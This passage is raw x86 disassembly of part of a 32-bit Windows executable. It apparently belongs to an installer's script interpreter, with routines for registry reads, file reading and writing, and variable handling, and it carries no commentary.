  4024e8:	6a 03                	push   $0x3
  4024ea:	e8 9a 08 00 00       	call   0x402d89
  4024ef:	59                   	pop    %ecx
  4024f0:	a3 f8 b5 40 00       	mov    %eax,0x40b5f8
  4024f5:	56                   	push   %esi
  4024f6:	89 55 c8             	mov    %edx,-0x38(%ebp)
  4024f9:	58                   	pop    %eax
  4024fa:	83 fe 03             	cmp    $0x3,%esi
  4024fd:	75 0f                	jne    0x40250e
  4024ff:	68 00 18 00 00       	push   $0x1800
  402504:	57                   	push   %edi
  402505:	53                   	push   %ebx
  402506:	ff 75 dc             	push   -0x24(%ebp)
  402509:	e8 68 0e 00 00       	call   0x403376
  40250e:	50                   	push   %eax
  40250f:	57                   	push   %edi
  402510:	ff 75 f0             	push   -0x10(%ebp)
  402513:	53                   	push   %ebx
  402514:	ff 75 bc             	push   -0x44(%ebp)
  402517:	ff 75 08             	push   0x8(%ebp)
  40251a:	ff 15 0c 80 40 00    	call   *0x40800c
  402520:	85 c0                	test   %eax,%eax
  402522:	75 03                	jne    0x402527
  402524:	89 5d fc             	mov    %ebx,-0x4(%ebp)
  402527:	ff 75 08             	push   0x8(%ebp)
  40252a:	e9 d3 00 00 00       	jmp    0x402602
  40252f:	68 19 00 02 00       	push   $0x20019
  402534:	e8 b2 08 00 00       	call   0x402deb
  402539:	6a 33                	push   $0x33
  40253b:	8b f0                	mov    %eax,%esi
  40253d:	e8 69 08 00 00       	call   0x402dab
  402542:	3b f3                	cmp    %ebx,%esi
  402544:	66 89 1f             	mov    %bx,(%edi)
  402547:	0f 84 e6 03 00 00    	je     0x402933
  40254d:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  402550:	c7 45 f0 00 08 00 00 	movl   $0x800,-0x10(%ebp)
  402557:	51                   	push   %ecx
  402558:	8d 4d 08             	lea    0x8(%ebp),%ecx
  40255b:	57                   	push   %edi
  40255c:	51                   	push   %ecx
  40255d:	53                   	push   %ebx
  40255e:	50                   	push   %eax
  40255f:	56                   	push   %esi
  402560:	ff 15 08 80 40 00    	call   *0x408008
  402566:	33 c9                	xor    %ecx,%ecx
  402568:	41                   	inc    %ecx
  402569:	85 c0                	test   %eax,%eax
  40256b:	75 2e                	jne    0x40259b
  40256d:	83 7d 08 04          	cmpl   $0x4,0x8(%ebp)
  402571:	74 13                	je     0x402586
  402573:	39 4d 08             	cmp    %ecx,0x8(%ebp)
  402576:	74 06                	je     0x40257e
  402578:	83 7d 08 02          	cmpl   $0x2,0x8(%ebp)
  40257c:	75 1d                	jne    0x40259b
  40257e:	8b 45 e0             	mov    -0x20(%ebp),%eax
  402581:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402584:	eb 74                	jmp    0x4025fa
  402586:	ff 37                	push   (%edi)
  402588:	33 c0                	xor    %eax,%eax
  40258a:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  40258d:	57                   	push   %edi
  40258e:	0f 94 c0             	sete   %al
  402591:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402594:	e8 30 40 00 00       	call   0x4065c9
  402599:	eb 66                	jmp    0x402601
  40259b:	66 89 1f             	mov    %bx,(%edi)
  40259e:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4025a1:	eb 5e                	jmp    0x402601
  4025a3:	68 19 00 02 00       	push   $0x20019
  4025a8:	e8 3e 08 00 00       	call   0x402deb
  4025ad:	6a 03                	push   $0x3
  4025af:	8b f0                	mov    %eax,%esi
  4025b1:	e8 d3 07 00 00       	call   0x402d89
  4025b6:	3b f3                	cmp    %ebx,%esi
  4025b8:	59                   	pop    %ecx
  4025b9:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4025bc:	66 89 1f             	mov    %bx,(%edi)
  4025bf:	0f 84 6e 03 00 00    	je     0x402933
  4025c5:	39 5d e0             	cmp    %ebx,-0x20(%ebp)
  4025c8:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  4025cd:	89 4d 08             	mov    %ecx,0x8(%ebp)
  4025d0:	74 0c                	je     0x4025de
  4025d2:	51                   	push   %ecx
  4025d3:	57                   	push   %edi
  4025d4:	50                   	push   %eax
  4025d5:	56                   	push   %esi
  4025d6:	ff 15 04 80 40 00    	call   *0x408004
  4025dc:	eb 1c                	jmp    0x4025fa
  4025de:	53                   	push   %ebx
  4025df:	53                   	push   %ebx
  4025e0:	53                   	push   %ebx
  4025e1:	8d 4d 08             	lea    0x8(%ebp),%ecx
  4025e4:	53                   	push   %ebx
  4025e5:	51                   	push   %ecx
  4025e6:	57                   	push   %edi
  4025e7:	50                   	push   %eax
  4025e8:	56                   	push   %esi
  4025e9:	ff 15 00 80 40 00    	call   *0x408000
  4025ef:	85 c0                	test   %eax,%eax
  4025f1:	74 07                	je     0x4025fa
  4025f3:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  4025fa:	66 89 9f fe 07 00 00 	mov    %bx,0x7fe(%edi)
  402601:	56                   	push   %esi
  402602:	ff 15 10 80 40 00    	call   *0x408010
  402608:	e9 22 06 00 00       	jmp    0x402c2f
  40260d:	57                   	push   %edi
  40260e:	e8 cf 3f 00 00       	call   0x4065e2
  402613:	3b c3                	cmp    %ebx,%eax
  402615:	0f 84 14 06 00 00    	je     0x402c2f
  40261b:	50                   	push   %eax
  40261c:	e9 cf f9 ff ff       	jmp    0x401ff0
  402621:	6a ed                	push   $0xffffffed
  402623:	e8 83 07 00 00       	call   0x402dab
  402628:	ff 75 d8             	push   -0x28(%ebp)
  40262b:	ff 75 d4             	push   -0x2c(%ebp)
  40262e:	50                   	push   %eax
  40262f:	e8 3e 3b 00 00       	call   0x406172
  402634:	83 f8 ff             	cmp    $0xffffffff,%eax
  402637:	0f 84 f3 02 00 00    	je     0x402930
  40263d:	50                   	push   %eax
  40263e:	e9 2f ef ff ff       	jmp    0x401572
  402643:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402646:	33 c9                	xor    %ecx,%ecx
  402648:	83 fa 38             	cmp    $0x38,%edx
  40264b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  40264e:	0f 94 c1             	sete   %cl
  402651:	3b c3                	cmp    %ebx,%eax
  402653:	8b f1                	mov    %ecx,%esi
  402655:	74 1b                	je     0x402672
  402657:	6a 01                	push   $0x1
  402659:	e8 2b 07 00 00       	call   0x402d89
  40265e:	66 a3 f8 ad 40 00    	mov    %ax,0x40adf8
  402664:	33 c0                	xor    %eax,%eax
  402666:	3b f3                	cmp    %ebx,%esi
  402668:	59                   	pop    %ecx
  402669:	0f 94 c0             	sete   %al
  40266c:	89 55 bc             	mov    %edx,-0x44(%ebp)
  40266f:	40                   	inc    %eax
  402670:	eb 3f                	jmp    0x4026b1
  402672:	83 fa 38             	cmp    $0x38,%edx
  402675:	75 2b                	jne    0x4026a2
  402677:	6a 21                	push   $0x21
  402679:	e8 2d 07 00 00       	call   0x402dab
  40267e:	68 00 04 00 00       	push   $0x400
  402683:	68 f8 ad 40 00       	push   $0x40adf8
  402688:	68 f8 b5 40 00       	push   $0x40b5f8
  40268d:	e8 12 40 00 00       	call   0x4066a4
  402692:	83 c4 0c             	add    $0xc,%esp
  402695:	68 f8 ad 40 00       	push   $0x40adf8
  40269a:	ff 15 28 81 40 00    	call   *0x408128
  4026a0:	eb 0f                	jmp    0x4026b1
  4026a2:	6a 11                	push   $0x11
  4026a4:	e8 02 07 00 00       	call   0x402dab
  4026a9:	50                   	push   %eax
  4026aa:	e8 e9 3f 00 00       	call   0x406698
  4026af:	03 c0                	add    %eax,%eax
  4026b1:	66 39 1f             	cmp    %bx,(%edi)
  4026b4:	89 45 08             	mov    %eax,0x8(%ebp)
  4026b7:	0f 84 76 02 00 00    	je     0x402933
  4026bd:	57                   	push   %edi
  4026be:	e8 1f 3f 00 00       	call   0x4065e2
  4026c3:	0b 75 f0             	or     -0x10(%ebp),%esi
  4026c6:	8b f8                	mov    %eax,%edi
  4026c8:	75 14                	jne    0x4026de
  4026ca:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4026cd:	74 0f                	je     0x4026de
  4026cf:	57                   	push   %edi
  4026d0:	57                   	push   %edi
  4026d1:	e8 7d 3b 00 00       	call   0x406253
  4026d6:	85 c0                	test   %eax,%eax
  4026d8:	0f 8c 55 02 00 00    	jl     0x402933
  4026de:	ff 75 08             	push   0x8(%ebp)
  4026e1:	68 f8 ad 40 00       	push   $0x40adf8
  4026e6:	57                   	push   %edi
  4026e7:	e8 38 3b 00 00       	call   0x406224
  4026ec:	e9 c8 ee ff ff       	jmp    0x4015b9
  4026f1:	6a 02                	push   $0x2
  4026f3:	89 5d f8             	mov    %ebx,-0x8(%ebp)
  4026f6:	58                   	pop    %eax
  4026f7:	50                   	push   %eax
  4026f8:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  4026fb:	e8 89 06 00 00       	call   0x402d89
  402700:	83 f8 01             	cmp    $0x1,%eax
  402703:	59                   	pop    %ecx
  402704:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402707:	89 45 bc             	mov    %eax,-0x44(%ebp)
  40270a:	0f 8c 1f 05 00 00    	jl     0x402c2f
  402710:	b9 ff 03 00 00       	mov    $0x3ff,%ecx
  402715:	3b c1                	cmp    %ecx,%eax
  402717:	7e 03                	jle    0x40271c
  402719:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  40271c:	66 39 1f             	cmp    %bx,(%edi)
  40271f:	0f 84 5e 01 00 00    	je     0x402883
  402725:	57                   	push   %edi
  402726:	89 5d c8             	mov    %ebx,-0x38(%ebp)
  402729:	e8 b4 3e 00 00       	call   0x4065e2
  40272e:	39 5d bc             	cmp    %ebx,-0x44(%ebp)
  402731:	89 45 e8             	mov    %eax,-0x18(%ebp)
  402734:	0f 8e 49 01 00 00    	jle    0x402883
  40273a:	8b 35 2c 81 40 00    	mov    0x40812c,%esi
  402740:	83 7d cc 39          	cmpl   $0x39,-0x34(%ebp)
  402744:	0f 85 8f 00 00 00    	jne    0x4027d9
  40274a:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40274d:	53                   	push   %ebx
  40274e:	50                   	push   %eax
  40274f:	6a 02                	push   $0x2
  402751:	58                   	pop    %eax
  402752:	2b 45 dc             	sub    -0x24(%ebp),%eax
  402755:	50                   	push   %eax
  402756:	8d 45 0a             	lea    0xa(%ebp),%eax
  402759:	50                   	push   %eax
  40275a:	ff 75 e8             	push   -0x18(%ebp)
  40275d:	ff 15 30 81 40 00    	call   *0x408130
  402763:	85 c0                	test   %eax,%eax
  402765:	0f 84 18 01 00 00    	je     0x402883
  40276b:	8b 4d c0             	mov    -0x40(%ebp),%ecx
  40276e:	3b cb                	cmp    %ebx,%ecx
  402770:	0f 84 0d 01 00 00    	je     0x402883
  402776:	66 0f b6 45 0a       	movzbw 0xa(%ebp),%ax
  40277b:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40277e:	89 4d b4             	mov    %ecx,-0x4c(%ebp)
  402781:	89 45 b0             	mov    %eax,-0x50(%ebp)
  402784:	0f 85 b5 00 00 00    	jne    0x40283f
  40278a:	8d 45 b0             	lea    -0x50(%ebp),%eax
  40278d:	6a 01                	push   $0x1
  40278f:	50                   	push   %eax
  402790:	8d 45 0a             	lea    0xa(%ebp),%eax
  402793:	51                   	push   %ecx
  402794:	50                   	push   %eax
  402795:	6a 08                	push   $0x8
  402797:	53                   	push   %ebx
  402798:	ff d6                	call   *%esi
  40279a:	85 c0                	test   %eax,%eax
  40279c:	75 68                	jne    0x402806
  40279e:	8b 7d b4             	mov    -0x4c(%ebp),%edi
  4027a1:	f7 df                	neg    %edi
  4027a3:	ff 4d c0             	decl   -0x40(%ebp)
  4027a6:	b8 fd ff 00 00       	mov    $0xfffd,%eax
  4027ab:	89 45 b0             	mov    %eax,-0x50(%ebp)
  4027ae:	74 59                	je     0x402809
  4027b0:	ff 4d b4             	decl   -0x4c(%ebp)
  4027b3:	47                   	inc    %edi
  4027b4:	6a 01                	push   $0x1
  4027b6:	53                   	push   %ebx
  4027b7:	57                   	push   %edi
  4027b8:	ff 75 e8             	push   -0x18(%ebp)
  4027bb:	ff 15 34 81 40 00    	call   *0x408134
  4027c1:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027c4:	6a 01                	push   $0x1
  4027c6:	50                   	push   %eax
  4027c7:	8d 45 0a             	lea    0xa(%ebp),%eax
  4027ca:	ff 75 c0             	push   -0x40(%ebp)
  4027cd:	50                   	push   %eax
  4027ce:	6a 08                	push   $0x8
  4027d0:	53                   	push   %ebx
  4027d1:	ff d6                	call   *%esi
  4027d3:	85 c0                	test   %eax,%eax
  4027d5:	74 cc                	je     0x4027a3
  4027d7:	eb 2d                	jmp    0x402806
  4027d9:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  4027dc:	75 16                	jne    0x4027f4
  4027de:	39 5d f8             	cmp    %ebx,-0x8(%ebp)
  4027e1:	75 11                	jne    0x4027f4
  4027e3:	53                   	push   %ebx
  4027e4:	ff 75 e8             	push   -0x18(%ebp)
  4027e7:	e8 67 3a 00 00       	call   0x406253
  4027ec:	85 c0                	test   %eax,%eax
  4027ee:	0f 8c 8f 00 00 00    	jl     0x402883
  4027f4:	8d 45 b0             	lea    -0x50(%ebp),%eax
  4027f7:	6a 02                	push   $0x2
  4027f9:	50                   	push   %eax
  4027fa:	ff 75 e8             	push   -0x18(%ebp)
  4027fd:	e8 f3 39 00 00       	call   0x4061f5
  402802:	85 c0                	test   %eax,%eax
  402804:	74 7d                	je     0x402883
  402806:	8b 45 b0             	mov    -0x50(%ebp),%eax
  402809:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  40280c:	75 31                	jne    0x40283f
  40280e:	66 83 7d c8 0d       	cmpw   $0xd,-0x38(%ebp)
  402813:	74 3b                	je     0x402850
  402815:	66 83 7d c8 0a       	cmpw   $0xa,-0x38(%ebp)
  40281a:	74 34                	je     0x402850
  40281c:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  40281f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402822:	ff 45 f8             	incl   -0x8(%ebp)
  402825:	66 3b c3             	cmp    %bx,%ax
  402828:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  40282c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40282f:	74 52                	je     0x402883
  402831:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402834:	3b 45 bc             	cmp    -0x44(%ebp),%eax
  402837:	0f 8c 03 ff ff ff    	jl     0x402740
  40283d:	eb 44                	jmp    0x402883
  40283f:	0f b7 c0             	movzwl %ax,%eax
  402842:	50                   	push   %eax
  402843:	ff 75 f4             	push   -0xc(%ebp)
  402846:	e8 7e 3d 00 00       	call   0x4065c9
  40284b:	e9 e8 03 00 00       	jmp    0x402c38
  402850:	66 39 45 c8          	cmp    %ax,-0x38(%ebp)
  402854:	74 1b                	je     0x402871
  402856:	66 3d 0d 00          	cmp    $0xd,%ax
  40285a:	74 06                	je     0x402862
  40285c:	66 3d 0a 00          	cmp    $0xa,%ax
  402860:	75 0f                	jne    0x402871
  402862:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402865:	8b 55 f8             	mov    -0x8(%ebp),%edx
  402868:	ff 45 f8             	incl   -0x8(%ebp)
  40286b:	66 89 04 51          	mov    %ax,(%ecx,%edx,2)
  40286f:	eb 12                	jmp    0x402883
  402871:	8b 45 b4             	mov    -0x4c(%ebp),%eax
  402874:	6a 01                	push   $0x1
  402876:	f7 d8                	neg    %eax
  402878:	53                   	push   %ebx
  402879:	50                   	push   %eax
  40287a:	ff 75 e8             	push   -0x18(%ebp)
  40287d:	ff 15 34 81 40 00    	call   *0x408134
  402883:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  402886:	8b 45 f8             	mov    -0x8(%ebp),%eax
  402889:	3b c3                	cmp    %ebx,%eax
  40288b:	66 89 1c 41          	mov    %bx,(%ecx,%eax,2)
  40288f:	e9 27 ed ff ff       	jmp    0x4015bb
  402894:	66 39 1f             	cmp    %bx,(%edi)
  402897:	0f 84 92 03 00 00    	je     0x402c2f
  40289d:	6a 02                	push   $0x2
  40289f:	e8 e5 04 00 00       	call   0x402d89
  4028a4:	59                   	pop    %ecx
  4028a5:	89 55 f0             	mov    %edx,-0x10(%ebp)
  4028a8:	ff 75 dc             	push   -0x24(%ebp)
  4028ab:	53                   	push   %ebx
  4028ac:	50                   	push   %eax
  4028ad:	57                   	push   %edi
  4028ae:	e8 2f 3d 00 00       	call   0x4065e2
  4028b3:	50                   	push   %eax
  4028b4:	ff 15 34 81 40 00    	call   *0x408134
  4028ba:	39 5d d4             	cmp    %ebx,-0x2c(%ebp)
  4028bd:	0f 8c 6c 03 00 00    	jl     0x402c2f
  4028c3:	50                   	push   %eax
  4028c4:	e9 dd 02 00 00       	jmp    0x402ba6
  4028c9:	57                   	push   %edi
  4028ca:	e8 13 3d 00 00       	call   0x4065e2
  4028cf:	3b c3                	cmp    %ebx,%eax
  4028d1:	0f 84 58 03 00 00    	je     0x402c2f
  4028d7:	50                   	push   %eax
  4028d8:	ff 15 38 81 40 00    	call   *0x408138
  4028de:	e9 4c 03 00 00       	jmp    0x402c2f
  4028e3:	ff 75 f4             	push   -0xc(%ebp)
  4028e6:	e8 f7 3c 00 00       	call   0x4065e2
  4028eb:	3b c3                	cmp    %ebx,%eax
  4028ed:	74 12                	je     0x402901
  4028ef:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  4028f5:	51                   	push   %ecx
  4028f6:	50                   	push   %eax
  4028f7:	ff 15 3c 81 40 00    	call   *0x40813c
  4028fd:	85 c0                	test   %eax,%eax
  4028ff:	75 47                	jne    0x402948
  402901:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402908:	66 89 1f             	mov    %bx,(%edi)
  40290b:	e9 1f 03 00 00       	jmp    0x402c2f
  402910:	6a 02                	push   $0x2
  402912:	e8 94 04 00 00       	call   0x402dab
  402917:	8d 8d 24 fd ff ff    	lea    -0x2dc(%ebp),%ecx
  40291d:	51                   	push   %ecx
  40291e:	50                   	push   %eax
  40291f:	ff 15 40 81 40 00    	call   *0x408140
  402925:	83 f8 ff             	cmp    $0xffffffff,%eax
  402928:	75 15                	jne    0x40293f
  40292a:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40292d:	66 89 18             	mov    %bx,(%eax)
  402930:	66 89 1f             	mov    %bx,(%edi)
  402933:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  40293a:	e9 f0 02 00 00       	jmp    0x402c2f
  40293f:	50                   	push   %eax
  402940:	ff 75 f4             	push   -0xc(%ebp)
  402943:	e8 81 3c 00 00       	call   0x4065c9
  402948:	8d 85 50 fd ff ff    	lea    -0x2b0(%ebp),%eax
  40294e:	50                   	push   %eax
  40294f:	57                   	push   %edi
  402950:	e9 44 01 00 00       	jmp    0x402a99
  402955:	6a f0                	push   $0xfffffff0
  402957:	bf 66 fd ff ff       	mov    $0xfffffd66,%edi
  40295c:	e8 4a 04 00 00       	call   0x402dab
  402961:	8b f0                	mov    %eax,%esi
  402963:	56                   	push   %esi
  402964:	89 75 c0             	mov    %esi,-0x40(%ebp)
  402967:	e8 5c 36 00 00       	call   0x405fc8
  40296c:	85 c0                	test   %eax,%eax
  40296e:	75 07                	jne    0x402977
  402970:	6a ed                	push   $0xffffffed
  402972:	e8 34 04 00 00       	call   0x402dab
  402977:	56                   	push   %esi
  402978:	e8 d0 37 00 00       	call   0x40614d
  40297d:	6a 02                	push   $0x2
  40297f:	68 00 00 00 40       	push   $0x40000000
  402984:	56                   	push   %esi
  402985:	e8 e8 37 00 00       	call   0x406172
  40298a:	83 f8 ff             	cmp    $0xffffffff,%eax
  40298d:	89 45 08             	mov    %eax,0x8(%ebp)
  402990:	0f 84 aa 00 00 00    	je     0x402a40
  402996:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  402999:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  40299c:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40299f:	0f 84 83 00 00 00    	je     0x402a28
  4029a5:	a1 74 9a 42 00       	mov    0x429a74,%eax
  4029aa:	8b 35 10 81 40 00    	mov    0x408110,%esi
  4029b0:	50                   	push   %eax
  4029b1:	6a 40                	push   $0x40
  4029b3:	89 45 bc             	mov    %eax,-0x44(%ebp)
  4029b6:	ff d6                	call   *%esi
  4029b8:	8b f8                	mov    %eax,%edi
  4029ba:	3b fb                	cmp    %ebx,%edi
  4029bc:	74 6a                	je     0x402a28
  4029be:	53                   	push   %ebx
  4029bf:	e8 39 0c 00 00       	call   0x4035fd
  4029c4:	ff 75 bc             	push   -0x44(%ebp)
  4029c7:	57                   	push   %edi
  4029c8:	e8 1a 0c 00 00       	call   0x4035e7
  4029cd:	ff 75 d8             	push   -0x28(%ebp)
  4029d0:	6a 40                	push   $0x40
  4029d2:	ff d6                	call   *%esi
  4029d4:	8b f0                	mov    %eax,%esi
  4029d6:	3b f3                	cmp    %ebx,%esi
  4029d8:	89 75 f0             	mov    %esi,-0x10(%ebp)
  4029db:	74 34                	je     0x402a11
  4029dd:	ff 75 d8             	push   -0x28(%ebp)
  4029e0:	56                   	push   %esi
  4029e1:	53                   	push   %ebx
  4029e2:	ff 75 d4             	push   -0x2c(%ebp)
  4029e5:	e8 8c 09 00 00       	call   0x403376
  4029ea:	eb 18                	jmp    0x402a04
  4029ec:	8b 0e                	mov    (%esi),%ecx
  4029ee:	8b 46 04             	mov    0x4(%esi),%eax
  4029f1:	83 c6 08             	add    $0x8,%esi
  4029f4:	51                   	push   %ecx
  4029f5:	03 c7                	add    %edi,%eax
  4029f7:	56                   	push   %esi
  4029f8:	50                   	push   %eax
  4029f9:	89 4d c4             	mov    %ecx,-0x3c(%ebp)
  4029fc:	e8 2c 37 00 00       	call   0x40612d
  402a01:	03 75 c4             	add    -0x3c(%ebp),%esi
  402a04:	38 1e                	cmp    %bl,(%esi)
  402a06:	75 e4                	jne    0x4029ec
  402a08:	ff 75 f0             	push   -0x10(%ebp)
  402a0b:	ff 15 0c 81 40 00    	call   *0x40810c
  402a11:	ff 75 bc             	push   -0x44(%ebp)
  402a14:	57                   	push   %edi
  402a15:	ff 75 08             	push   0x8(%ebp)
  402a18:	e8 07 38 00 00       	call   0x406224
  402a1d:	57                   	push   %edi
  402a1e:	ff 15 0c 81 40 00    	call   *0x40810c
  402a24:	83 4d c8 ff          	orl    $0xffffffff,-0x38(%ebp)
  402a28:	53                   	push   %ebx
  402a29:	53                   	push   %ebx
  402a2a:	ff 75 08             	push   0x8(%ebp)
  402a2d:	ff 75 c8             	push   -0x38(%ebp)
  402a30:	e8 41 09 00 00       	call   0x403376
  402a35:	ff 75 08             	push   0x8(%ebp)
  402a38:	8b f8                	mov    %eax,%edi
  402a3a:	ff 15 fc 80 40 00    	call   *0x4080fc
  402a40:	6a f3                	push   $0xfffffff3
  402a42:	3b fb                	cmp    %ebx,%edi
  402a44:	5e                   	pop    %esi
  402a45:	7d 13                	jge    0x402a5a
  402a47:	6a ef                	push   $0xffffffef
  402a49:	5e                   	pop    %esi
  402a4a:	ff 75 c0             	push   -0x40(%ebp)
  402a4d:	ff 15 44 81 40 00    	call   *0x408144
  402a53:	c7 45 fc 01 00 00 00 	movl   $0x1,-0x4(%ebp)
  402a5a:	56                   	push   %esi
  402a5b:	e9 96 f8 ff ff       	jmp    0x4022f6
  402a60:	53                   	push   %ebx
  402a61:	e8 23 03 00 00       	call   0x402d89
  402a66:	8b f8                	mov    %eax,%edi
  402a68:	59                   	pop    %ecx
  402a69:	3b 3d 8c 9a 42 00    	cmp    0x429a8c,%edi
  402a6f:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402a72:	0f 83 bb fe ff ff    	jae    0x402933
  402a78:	8b f7                	mov    %edi,%esi
  402a7a:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402a7d:	69 f6 18 08 00 00    	imul   $0x818,%esi,%esi
  402a83:	03 35 88 9a 42 00    	add    0x429a88,%esi
  402a89:	3b c3                	cmp    %ebx,%eax
  402a8b:	7c 1c                	jl     0x402aa9
  402a8d:	8b 0c 86             	mov    (%esi,%eax,4),%ecx
  402a90:	75 11                	jne    0x402aa3
  402a92:	83 c6 18             	add    $0x18,%esi
  402a95:	56                   	push   %esi
  402a96:	ff 75 f4             	push   -0xc(%ebp)
  402a99:	e8 e4 3b 00 00       	call   0x406682
  402a9e:	e9 8c 01 00 00       	jmp    0x402c2f
  402aa3:	51                   	push   %ecx
  402aa4:	e9 fd 00 00 00       	jmp    0x402ba6
  402aa9:	83 c9 ff             	or     $0xffffffff,%ecx
  402aac:	2b c8                	sub    %eax,%ecx
  402aae:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  402ab1:	74 10                	je     0x402ac3
  402ab3:	6a 01                	push   $0x1
  402ab5:	e8 cf 02 00 00       	call   0x402d89
  402aba:	59                   	pop    %ecx
  402abb:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402abe:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  402ac1:	eb 10                	jmp    0x402ad3
  402ac3:	ff 75 e0             	push   -0x20(%ebp)
  402ac6:	8d 46 18             	lea    0x18(%esi),%eax
  402ac9:	50                   	push   %eax
  402aca:	e8 f0 3b 00 00       	call   0x4066bf
  402acf:	80 4e 09 01          	orb    $0x1,0x9(%esi)
  402ad3:	8b 45 d8             	mov    -0x28(%ebp),%eax
  402ad6:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402ad9:	89 0c 86             	mov    %ecx,(%esi,%eax,4)
  402adc:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402adf:	0f 84 4a 01 00 00    	je     0x402c2f
  402ae5:	57                   	push   %edi
  402ae6:	e8 92 e6 ff ff       	call   0x40117d
  402aeb:	e9 3f 01 00 00       	jmp    0x402c2f
  402af0:	53                   	push   %ebx
  402af1:	e8 93 02 00 00       	call   0x402d89
  402af6:	83 f8 20             	cmp    $0x20,%eax
  402af9:	59                   	pop    %ecx
  402afa:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402afd:	0f 83 30 fe ff ff    	jae    0x402933
  402b03:	39 5d dc             	cmp    %ebx,-0x24(%ebp)
  402b06:	74 22                	je     0x402b2a
  402b08:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b0b:	74 12                	je     0x402b1f
  402b0d:	50                   	push   %eax
  402b0e:	e8 86 e7 ff ff       	call   0x401299
  402b13:	53                   	push   %ebx
  402b14:	53                   	push   %ebx
  402b15:	e8 d5 e6 ff ff       	call   0x4011ef
  402b1a:	e9 10 01 00 00       	jmp    0x402c2f
  402b1f:	53                   	push   %ebx
  402b20:	e8 bd e7 ff ff       	call   0x4012e2
  402b25:	e9 99 fd ff ff       	jmp    0x4028c3
  402b2a:	39 5d d8             	cmp    %ebx,-0x28(%ebp)
  402b2d:	74 15                	je     0x402b44
  402b2f:	8b 15 70 9a 42 00    	mov    0x429a70,%edx
  402b35:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  402b38:	89 8c 82 94 00 00 00 	mov    %ecx,0x94(%edx,%eax,4)
  402b3f:	e9 eb 00 00 00       	jmp    0x402c2f
  402b44:	8b 0d 70 9a 42 00    	mov    0x429a70,%ecx
  402b4a:	ff b4 81 94 00 00 00 	push   0x94(%ecx,%eax,4)
  402b51:	ff 75 f4             	push   -0xc(%ebp)
  402b54:	e8 66 3b 00 00       	call   0x4066bf
  402b59:	e9 d1 00 00 00       	jmp    0x402c2f
  402b5e:	8b 45 dc             	mov    -0x24(%ebp),%eax
  402b61:	2b c3                	sub    %ebx,%eax
  402b63:	74 4b                	je     0x402bb0
  402b65:	48                   	dec    %eax
  402b66:	0f 85 c3 00 00 00    	jne    0x402c2f
  402b6c:	6a 02                	push   $0x2
  402b6e:	e8 16 02 00 00       	call   0x402d89
  402b73:	6a 04                	push   $0x4
  402b75:	8b f0                	mov    %eax,%esi
  402b77:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b7a:	e8 0a 02 00 00       	call   0x402d89
  402b7f:	59                   	pop    %ecx
  402b80:	89 55 f0             	mov    %edx,-0x10(%ebp)
  402b83:	59                   	pop    %ecx
  402b84:	89 5d 08             	mov    %ebx,0x8(%ebp)
  402b87:	0f b6 c8             	movzbl %al,%ecx
  402b8a:	c1 e8 18             	shr    $0x18,%eax
  402b8d:	3b f3                	cmp    %ebx,%esi
  402b8f:	75 05                	jne    0x402b96
  402b91:	be e0 9a 42 00       	mov    $0x429ae0,%esi
  402b96:	03 c6                	add    %esi,%eax
  402b98:	51                   	push   %ecx
  402b99:	50                   	push   %eax
  402b9a:	8d 45 08             	lea    0x8(%ebp),%eax
  402b9d:	50                   	push   %eax
  402b9e:	e8 8a 35 00 00       	call   0x40612d
  402ba3:	ff 75 08             	push   0x8(%ebp)
  402ba6:	ff 75 f4             	push   -0xc(%ebp)
  402ba9:	e8 1b 3a 00 00       	call   0x4065c9
  402bae:	eb 7f                	jmp    0x402c2f
  402bb0:	6a 05                	push   $0x5
  402bb2:	e8 bf 3e 00 00       	call   0x406a76
  402bb7:	6a 22                	push   $0x22
  402bb9:	8b f0                	mov    %eax,%esi
  402bbb:	e8 eb 01 00 00       	call   0x402dab
  402bc0:	3b f3                	cmp    %ebx,%esi
  402bc2:	74 37                	je     0x402bfb
  402bc4:	8d 4d a0             	lea    -0x60(%ebp),%ecx
  402bc7:	51                   	push   %ecx
  402bc8:	50                   	push   %eax
  402bc9:	ff 15 9c 82 40 00    	call   *0x40829c
  402bcf:	85 c0                	test   %eax,%eax
  402bd1:	7c 28                	jl     0x402bfb
  402bd3:	8d 45 08             	lea    0x8(%ebp),%eax
  402bd6:	50                   	push   %eax
